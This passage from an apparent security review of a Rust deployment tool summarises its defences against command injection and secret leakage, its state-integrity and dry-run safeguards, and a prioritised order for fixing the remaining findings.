- **Command-injection surface at the Rust boundary** is well-defended:
  option-injection rejection (`--` end-of-options + refusing `-`-prefixed hosts),
  the `Secret` type with a non-shell sentinel + `assert_no_secret_leak` at every
  effect boundary, and POSIX single-quoting via `sh_quote`.
- **Secrets don't leak through the Rust layer:** hand-written `Debug`, `to_string`
  yielding a detectable sentinel, a `+` ban, and redaction at every output sink
  (`on_print`, thrown errors, the plan log, traces).
- **State integrity:** atomic fsync'd writes with unique temp files, directory
  fsync, corrupt-state fail-loud (no silent reset), future-version refusal,
  reload-before-write merge for nested runs, and `0600` on state/key/backup.
- **Dry-run is structurally safe:** no lock, no writes (overlay store), per-builtin
  effect classification, and a sim that keeps reads consistent with stubbed writes,
  seeded from one real probe.
- **Transactions** implement correct LIFO, error-isolated, reentrancy-safe,
  deadlock-free unwind semantics (well unit-tested).
- **Strong unit coverage** of exactly these Rust-core invariants; the full suite
  passes with `--locked` and clippy-as-errors.

The gap is concentrated where the real orchestration lives — the Rhai stdlib and its
live execution path — and in operational hardening (timeouts, signals, decryption
wiring) rather than in the core safety primitives.

---

## Suggested remediation order

1. **R3** (ENC decryption wiring or loud doc) and **R1/R2** (injection) — correctness
   and security, small diffs.
2. **R4** (probe classifier) and **R5** (SSH timeouts/keep-alive) — one-line-ish fixes
   that prevent wedged deploys.
3. **R6 + R7** (rollback blackhole guard + signal handling) — the "makes an incident
   worse" class.
4. **R8** (a live-mode test seam) — unblocks testing everything else.
5. The remaining Medium stdlib items (R9, R10, health-check URL/timeout, concurrency).
6. CI hardening (fmt, audit, MSRV, macOS) and flaky-test cleanup.
